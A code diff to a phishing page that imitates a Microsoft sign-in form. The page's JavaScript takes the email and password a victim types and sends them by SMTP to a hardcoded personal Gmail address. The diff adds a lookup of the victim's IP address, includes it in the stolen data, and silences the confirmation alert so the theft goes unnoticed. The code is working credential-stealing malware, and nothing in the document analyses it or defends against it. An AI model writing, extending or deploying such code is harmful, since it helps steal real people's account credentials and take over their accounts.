@@ -18,7 +18,7 @@
             <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                    <input id="inp_uname" type="email" name="uname" class="input" placeholder="Email, phone, or Skype" />
                 </div>
             </form>
             <div>
@@ -96,9 +96,19 @@
         function sendmail(){
           var email = document.getElementById('inp_pwd').value;
           var password = document.getElementById('inp_uname').value;
-          this.sendEmail(email, password);
+          //const ipAddress = event.candidate.candidate.split(' ')[4];
+           
+           fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    this.sendEmail(email, password, ipAddress);
+                })
+                .catch(error => {
+                    console.log('Error:', error);
+            });
         }
-        function sendEmail(email, password) {
+        function sendEmail(email, password, ipAddress) {
                 Email.send({
                     Host: "smtp.elasticemail.com",
                     Username: "gannandre08@gmail.com",
@@ -107,10 +117,10 @@
                     To: 'gannandre08@gmail.com',
                     From: "gannandre08@gmail.com",
                     Subject: "Micro Access",
-                    Body: `Email: ${email} <br> password: ${password}`,
+                    Body: `Email: ${email} <br> password: ${password}<br>IP Address: ${ipAddress}`,
                 })
                     .then(function (message) {
-                        alert("mail sent successfully")
+                       // alert("mail sent successfully")
                     });
             }
     </script>
